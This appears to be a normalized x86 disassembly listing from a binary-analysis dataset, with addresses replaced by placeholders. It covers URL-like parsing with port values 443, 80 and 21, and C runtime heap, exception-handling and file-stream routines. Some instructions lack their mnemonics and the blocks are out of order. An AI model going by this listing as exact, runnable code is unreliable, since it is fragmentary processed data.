je r-xdata
push 0x1
lea ecx [ esi + ebp + 0x1 ]
push rw-data
push ecx
call sub_4092e0
mov edi [ esp + 0x430 ]
add esp 0xc
test eax eax
jne r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ebp ecx
jae r-xdata
cmp edi ebx
je r-xdata
cmp edi ebx
je r-xdata
push 0x1
lea eax [ esi + ebp ]
push rw-data
push eax
call sub_4092e0
add esp 0xc
test eax eax
je r-xdata
xor ebp ebp
mov [ esp + 0x10 ] ebx
mov [ esp + 0x14 ] ebx
push 0x4
push rw-data
push edi
call sub_409430
add esp 0xc
mov [ edi + 0x5 ] 0x0
add ebp 0x3
mov [ esp + 0x10 ] ebp
mov [ esp + 0x14 ] ebp
jmp r-xdata
push ebp
push esi
push edi
call sub_409430
add esp 0xc
mov [ edi + ebp ] 0x0
mov edi esi
or ecx 0xffffffff
xor eax eax
inc ebp
[ edi ]
not ecx
dec ecx
jne r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
mov eax [ esp + 0x14 ]
not ecx
dec ecx
cmp eax ecx
jae r-xdata
mov edx [ esp + 0x14 ]
lea ebx [ edx + esi ]
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
je r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
je r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
mov ebx [ esp + 0x10 ]
[ edi ]
not ecx
dec ecx
je r-xdata
push 0x1
push rw-data
push ebx
call sub_4092e0
add esp 0xc
test eax eax
je r-xdata
mov ebx [ esp + 0x10 ]
cmp ebx ebp
ja r-xdata
lea ebx [ esi + ebp ]
cmp ebx [ esp + 0x14 ]
jae r-xdata
lea eax [ ebx + esi ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x14 ]
mov edi esi
inc eax
or ecx 0xffffffff
mov [ esp + 0x14 ] eax
xor eax eax
inc ebx
[ edi ]
not ecx
dec ecx
jne r-xdata
mov eax [ esp + 0x424 ]
mov edi rw-data
mov ecx eax
push 0x1
lea edx [ ebx + esi ]
push rw-data
push edx
call sub_4092e0
add esp 0xc
test eax eax
je r-xdata
push 0x1
push rw-data
push ebx
call sub_4092e0
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esp + 0x14 ]
lea ebp [ ecx + 0x1 ]
mov [ esp + 0x10 ] ebp
mov eax [ esp + 0x10 ]
mov ebp [ esp + 0x428 ]
mov edi ebx
sub edi eax
add eax esi
push edi
push eax
push ebp
call sub_409430
mov [ edi + ebp + 0x1 ] 0x0
mov edi [ esp + 0x20 ]
sub edi ebx
lea eax [ ebx + esi + 0x1 ]
mov ebx [ esp + 0x438 ]
lea edx [ edi - 0x1 ]
push edx
push eax
push ebx
call sub_409430
add esp 0x18
mov [ edi + ebx ] 0x0
mov ecx [ esp + 0x18 ]
push 0x1
push rw-data
push ecx
call sub_4092e0
add esp 0xc
test eax eax
je r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
mov eax [ esp + 0x14 ]
not ecx
dec ecx
cmp eax ecx
jae r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
test dl dl
je r-xdata
mov ax [ rw-data ]
mov ecx 0xff
mov [ esp + 0x1c ] ax
xor eax eax
lea edi [ esp + 0x1e ]
lea edx [ ebx + esi + 0x1 ]
[ edi ]
mov ecx ebp
sub ecx ebx
stosw [ edi ]
push ecx
lea eax [ esp + 0x20 ]
push edx
push eax
call sub_409430
lea ecx [ esp + 0x28 ]
push ecx
call sub_408f08
mov edx [ esp + 0x444 ]
mov [ edx ] eax
mov eax [ esp + 0x20 ]
sub ebx eax
add eax esi
push ebx
push eax
mov eax [ esp + 0x448 ]
push eax
call sub_409430
add esp 0x1c
jmp r-xdata
inc ebx
cmp ebx ebp
jbe r-xdata
inc ebp
mov edi esi
or ecx 0xffffffff
xor eax eax
inc ebx
[ edi ]
not ecx
dec ecx
jne r-xdata
mov edi [ esp + 0x18 ]
inc ebx
inc edi
or ecx 0xffffffff
mov [ esp + 0x18 ] edi
mov edi esi
xor eax eax
[ edi ]
not ecx
dec ecx
jne r-xdata
mov edi rw-data
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x434 ]
mov edx ebp
sub edx eax
add eax esi
push edx
push eax
mov eax [ esp + 0x438 ]
mov [ ecx ] 0x1bb
push eax
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov bl [ ecx + 0x1 ]
mov dl bl
cmp bl [ edi + 0x1 ]
jne r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ebp ecx
jae r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ebp ecx
jae r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ebp ecx
jae r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
call sub_409430
add esp 0xc
test ecx ecx
jne r-xdata
add ecx 0x2
add edi 0x2
test dl dl
jne r-xdata
mov eax [ esp + 0x438 ]
pop edi
pop esi
pop ebp
mov [ eax ] 0x2f
mov [ eax + 0x1 ] 0x0
pop ebx
add esp 0x40c
retn
mov edi esi
or ecx 0xffffffff
[ edi ]
mov eax [ esp + 0x438 ]
not ecx
dec ecx
sub ecx ebp
add ebp esi
push ecx
push ebp
push eax
call sub_409430
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40c
retn
mov [ eax ] 0x50
mov [ eax ] 0x15
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ edi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov bl [ ecx ]
mov dl bl
cmp bl [ edi ]
jne r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x430 ]
mov ecx ebp
sub ecx eax
add eax esi
push ecx
push eax
push edx
test eax eax
mov eax [ esp + 0x434 ]
jne r-xdata
add eax 0x2
add edi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov bl [ edi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_408220
mov eax [ r--data ]
push ebx
push ebp
mov ebp ecx
push esi
push edi
mov edx [ ebp + 0x8 ]
mov edi [ esp + 0x18 ]
sub eax edx
cmp eax edi
ja r-xdata
xor esi esi
cmp edi esi
jbe r-xdata
call sub_40fc40
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx edi
add ebx ecx
cmp ebx 0xfffffffd
jbe r-xdata
mov ecx [ ebp + 0x4 ]
cmp ecx esi
je r-xdata
call sub_40fc40
cmp ebx esi
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
cmp [ ebp + 0xc ] ebx
jae r-xdata
cmp ecx esi
je r-xdata
cmp al 0xff
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi [ esp + 0x14 ]
mov ecx edi
mov edi [ ebp + 0x4 ]
add edi edx
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x4 ]
mov [ ebp + 0x8 ] ebx
mov [ eax + ebx ] 0x0
push ebx
mov ecx ebp
call sub_4042f0
push esi
mov ecx ebp
call sub_404150
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn 0x8
cmp ebx esi
jne r-xdata
dec al
pop edi
mov [ ecx - 0x1 ] al
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] esi
mov [ ebp + 0xc ] esi
mov eax ebp
pop esi
pop ebp
pop ebx
retn 0x8
sub_4082e0
push ebx
mov ebx [ esp + 0xc ]
push ebp
cmp ebx 0xfffffffd
mov ebp ecx
jbe r-xdata
mov ecx [ ebp + 0x4 ]
xor edx edx
cmp ecx edx
je r-xdata
call sub_40fc40
cmp ebx edx
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x1f
ja r-xdata
push 0x1
mov ecx ebp
call sub_404100
mov eax ebp
pop ebp
pop ebx
retn 0x8
cmp al 0xff
je r-xdata
push 0x1
mov ecx ebp
call sub_404100
cmp eax ebx
jae r-xdata
cmp ebx edx
jne r-xdata
mov ecx ebx
push esi
mov esi [ esp + 0x10 ]
mov eax ecx
push edi
mov edi [ ebp + 0x4 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax ebp
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0x4 ]
pop edi
mov [ ebp + 0x8 ] ebx
pop esi
mov [ ebx + ecx ] 0x0
pop ebp
pop ebx
retn 0x8
push ebx
mov ecx ebp
call sub_4042f0
dec al
mov [ ecx - 0x1 ] al
mov [ ebp + 0x4 ] edx
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] edx
mov eax ebp
pop ebp
pop ebx
retn 0x8
sub_4083b0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push esi
call sub_4096e7
pop ecx
test eax eax
push esi
je r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
push eax
call sub_409712
pop ecx
pop ecx
pop esi
retn
sub_4083f1
cmp [ esp + 0x4 ] 0xffffffe0
ja r-xdata
xor eax eax
push [ esp + 0x4 ]
call sub_40841d
test eax eax
pop ecx
jne r-xdata
retn
cmp [ esp + 0x8 ] eax
je r-xdata
push [ esp + 0x4 ]
call sub_40a1e8
test eax eax
pop ecx
jne r-xdata
sub_40841d
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
test esi esi
jne r-xdata
push esi
call sub_409a3d
test eax eax
pop ecx
jne r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
push 0x1
pop esi
pop esi
retn
sub_408453
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx - 0x4 ]
mov ebp [ ebp - 0x4 ]
jmp eax
sub_408495
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov eax [ fs : 0x0 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and al 0xfd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ fs : 0x0 ]
mov ebx [ ebp - 0x8 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_4084e4
push ebp
mov ebp esp
sub esp 0x4
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40a203
add esp 0x20
mov [ ebp + 0x14 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp + 0x14 ]
mov esp ebp
pop ebp
retn
sub_40851a
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] sub_40856e
inc eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_40aa00
mov ecx eax
mov eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_40856e
push ebp
mov ebp esp
cld
mov eax [ ebp + 0xc ]
push 0x0
push eax
push [ eax + 0x10 ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_40a203
add esp 0x20
pop ebp
retn
sub_408593
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
push edi
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_408647
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x14 ] eax
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] r-xdata
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x34 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ rw-data ]
pop ecx
pop ecx
and [ ebp - 0x34 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
mov eax [ ebp - 0x34 ]
pop edi
pop esi
pop ebx
leave
retn
sub_408647
push ebp
mov ebp esp
push ebx
push esi
push edi
cld
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
test eax eax
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_40a203
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
push 0x1
pop eax
jmp r-xdata
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp [ ebx + 0x18 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_408495
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4086bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
cmp [ ebp + 0xc ] 0x0
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0xc ]
mov ebx [ edi + 0x10 ]
mov eax esi
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] eax
jl r-xdata
mov ecx [ ebp + 0x14 ]
inc esi
mov [ ecx ] esi
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
cmp eax [ edi + 0xc ]
ja r-xdata
cmp esi 0xffffffff
jne r-xdata
call sub_40aaa2
cmp esi eax
jbe r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
lea eax [ esi + esi * 4 ]
cmp [ ebx + eax * 4 + 0x4 ] ecx
lea eax [ ebx + eax * 4 ]
jge r-xdata
call sub_40aaa2
lea eax [ esi + esi * 4 ]
pop edi
pop esi
lea eax [ ebx + eax * 4 ]
pop ebx
leave
retn
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov eax [ ebp + 0x8 ]
dec [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov eax [ ebp - 0x4 ]
sub_408738
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40877a
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push eax
push 0xfffffffe
push sub_408758
push [ fs : 0x0 ]
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
cmp esi [ esp + 0x24 ]
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0x8 ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_40880e
call [ ebx + esi * 4 + 0x8 ]
mov eax [ esp + 0x20 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_408826
push esi
push [ rw-data ]
call sub_40ad1a
mov edx [ rw-data ]
pop ecx
mov ecx [ rw-data ]
mov esi ecx
sub esi edx
add esi 0x4
cmp eax esi
pop esi
jae r-xdata
mov eax [ esp + 0x4 ]
mov [ ecx ] eax
add [ rw-data ] 0x4
retn
push edx
call sub_40ad1a
add eax 0x10
push eax
push [ rw-data ]
call sub_40aaf8
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ rw-data ]
sub ecx [ rw-data ]
mov [ rw-data ] eax
sar ecx 0x2
lea ecx [ eax + ecx * 4 ]
mov [ rw-data ] ecx
retn
sub_4088a5
push 0x80
call sub_4083df
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
push 0x18
call sub_409624
mov eax [ rw-data ]
pop ecx
sub_4088d4
mov eax [ esp + 0x4 ]
mov ecx eax
cmp [ eax ] 0x0
je r-xdata
mov edx [ esp + 0x8 ]
push esi
inc ecx
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
mov si [ edx ]
mov [ ecx ] si
inc ecx
inc ecx
inc edx
inc edx
test si si
jne r-xdata
pop esi
retn
sub_4088fe
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
push esi
mov dx [ ecx ]
lea esi [ eax + 0x2 ]
mov [ eax ] dx
pop esi
retn
mov dx [ ecx ]
mov [ esi ] dx
inc esi
inc esi
jmp r-xdata
inc ecx
inc ecx
test dx dx
je r-xdata
sub_408923
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0x0
lea eax [ ecx + 0x2 ]
je r-xdata
sub eax ecx
sar eax 0x1
dec eax
retn
mov dx [ eax ]
inc eax
inc eax
test dx dx
jne r-xdata
sub_408940
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
mov eax [ esi + 0xc ]
test al 0x40
je r-xdata
test al 0x83
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax edi
push esi
call sub_40ae5c
push esi
mov edi eax
call sub_40adf6
push [ esi + 0x10 ]
call sub_40ad43
add esp 0xc
test eax eax
jge r-xdata
and [ esi + 0xc ] 0x0
pop edi
pop esi
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_4083b0
and [ esi + 0x1c ] 0x0
pop ecx
sub_408996
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
test edi edi
mov [ ebp + 0x8 ] eax
mov ebx edi
jne r-xdata
mov esi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x14 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp + 0x14 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
mov eax [ ebp + 0x8 ]
push esi
movsx eax [ eax ]
push eax
call sub_40af2e
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
test ecx ecx
je r-xdata
cmp ebx eax
mov edi ebx
jb r-xdata
mov eax edi
inc [ ebp + 0x8 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp + 0x14 ] eax
test eax eax
jg r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
push esi
call sub_40ae5c
test eax eax
pop ecx
jne r-xdata
push edi
push [ ebp + 0x8 ]
push [ esi ]
call sub_40b1f0
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp + 0x8 ] edi
jmp r-xdata
mov edi eax
test ebx ebx
jne r-xdata
mov [ ebp + 0x14 ] 0x1
mov edi ebx
mov eax ebx
xor edx edx
div [ ebp + 0x14 ]
mov edi ebx
sub edi edx
jmp r-xdata
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0x4 ]
jmp r-xdata
add [ ebp + 0x8 ] eax
sub ebx eax
cmp eax edi
jb r-xdata
push edi
push [ ebp + 0x8 ]
push [ esi + 0x10 ]
call sub_40b043
add esp 0xc
cmp eax 0xffffffff
je r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
sub_408ad3
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
mov ecx edi
test edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp + 0x8 ] ecx
jne r-xdata
mov esi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x14 ] 0x1000
jmp r-xdata
mov eax [ esi + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
test [ esi + 0xc ] 0x10c
je r-xdata
cmp ecx [ ebp + 0x14 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_40b713
cmp eax 0xffffffff
pop ecx
je r-xdata
cmp [ ebp + 0x14 ] 0x0
mov eax ecx
je r-xdata
cmp ecx eax
mov edi ecx
jb r-xdata
mov eax edi
xor edx edx
sub eax [ ebp + 0x8 ]
div [ ebp + 0xc ]
jmp r-xdata
mov [ ebx ] al
mov eax [ esi + 0x18 ]
inc ebx
dec [ ebp + 0x8 ]
mov [ ebp + 0x14 ] eax
push eax
push ebx
push [ esi + 0x10 ]
call sub_40b7ec
add esp 0xc
test eax eax
je r-xdata
xor edx edx
div [ ebp + 0x14 ]
mov eax ecx
sub eax edx
push edi
push [ esi ]
push ebx
call sub_40b1f0
sub [ ebp + 0x8 ] edi
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
add ebx edi
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov edi eax
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
or [ esi + 0xc ] 0x20
sub [ ebp + 0x8 ] eax
add ebx eax
jmp r-xdata
sub_408bbb
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
mov edi [ esi + 0x10 ]
call sub_40ae5c
and [ esi + 0xc ] 0xffffffcf
cmp edi 0xffffffff
pop ecx
je r-xdata
mov eax rw-data
mov eax edi
mov ecx edi
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + ecx * 8 ]
jmp r-xdata
push 0x0
push 0x0
push edi
call sub_40b9e2
add esp 0xc
pop edi
pop esi
retn
and al 0xfc
mov [ esi + 0xc ] eax
and [ eax + 0x4 ] 0xfd
mov eax [ esi + 0xc ]
test al 0x80
je r-xdata
sub_408c0f
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov esi [ edi + 0x10 ]
cmp [ edi + 0x4 ] ebx
mov [ ebp - 0xc ] esi
jge r-xdata
push 0x1
push ebx
push esi
call sub_40b9e2
add esp 0xc
cmp eax ebx
mov [ ebp - 0x4 ] eax
jl r-xdata
mov [ edi + 0x4 ] ebx
or eax 0xffffffff
jmp r-xdata
mov edx [ edi + 0xc ]
test dx 0x108
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi ]
mov ecx [ edi + 0x8 ]
mov ebx eax
sub ebx ecx
test dl 0x3
mov [ ebp - 0x8 ] ebx
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test dl 0x80
jne r-xdata
mov edx esi
mov ebx esi
sar edx 0x5
and ebx 0x1f
mov edx [ edx * 4 + rw-data ]
test [ edx + ebx * 8 + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov [ rw-data ] 0x16
mov edx ecx
test [ edi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
add eax ecx
mov edx [ edi + 0x4 ]
test edx edx
jne r-xdata
inc edx
jmp r-xdata
inc [ ebp - 0x8 ]
sub eax ecx
add eax edx
mov [ ebp + 0x8 ] eax
mov eax esi
sar eax 0x5
and esi 0x1f
lea ebx [ eax * 4 + rw-data ]
shl esi 0x3
mov eax [ ebx ]
test [ esi + eax + 0x4 ] 0x80
je r-xdata
and [ ebp - 0x8 ] edx
jmp r-xdata
cmp edx eax
jae r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x4 ] eax
push 0x2
push 0x0
push [ ebp - 0xc ]
call sub_40b9e2
add esp 0xc
cmp eax [ ebp - 0x4 ]
jne r-xdata
push 0x0
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
call sub_40b9e2
mov eax 0x200
add esp 0xc
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
test [ edi + 0xd ] 0x20
jmp r-xdata
cmp [ eax ] 0xa
jne r-xdata
inc [ ebp + 0x8 ]
test ch 0x4
je r-xdata
je r-xdata
inc eax
jmp r-xdata
inc [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ esi + eax + 0x4 ] 0x4
cmp eax ecx
jae r-xdata
sub_408d67
push esi
mov esi [ esp + 0x8 ]
push edi
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
mov [ rw-data ] 0x16
or eax 0xffffffff
mov edi [ esp + 0x14 ]
test edi edi
je r-xdata
and al 0xef
cmp edi 0x1
mov [ esi + 0xc ] eax
jne r-xdata
cmp edi 0x1
je r-xdata
push esi
call sub_40ae5c
mov eax [ esi + 0xc ]
pop ecx
test al 0x80
je r-xdata
push esi
call sub_408c0f
add [ esp + 0x14 ] eax
pop ecx
xor edi edi
cmp edi 0x2
jne r-xdata
test al 0x1
je r-xdata
and al 0xfc
mov [ esi + 0xc ] eax
jmp r-xdata
push edi
push [ esp + 0x14 ]
push [ esi + 0x10 ]
call sub_40b9e2
add esp 0xc
xor ecx ecx
cmp eax 0xffffffff
setne cl
dec ecx
mov eax ecx
jmp r-xdata
test al 0x8
je r-xdata
pop edi
pop esi
retn
test ah 0x4
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_408df3
mov edx [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
push edi
mov cx [ esi ]
pop edi
pop esi
test eax eax
jge r-xdata
test cx cx
je r-xdata
jle r-xdata
or eax 0xffffffff
retn
inc edx
inc edx
inc esi
inc esi
mov cx [ esi ]
jmp r-xdata
retn
push 0x1
pop eax
movzx eax [ edx ]
movzx edi cx
sub eax edi
jne r-xdata
sub_408e30
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_408e80
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_408ea0
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
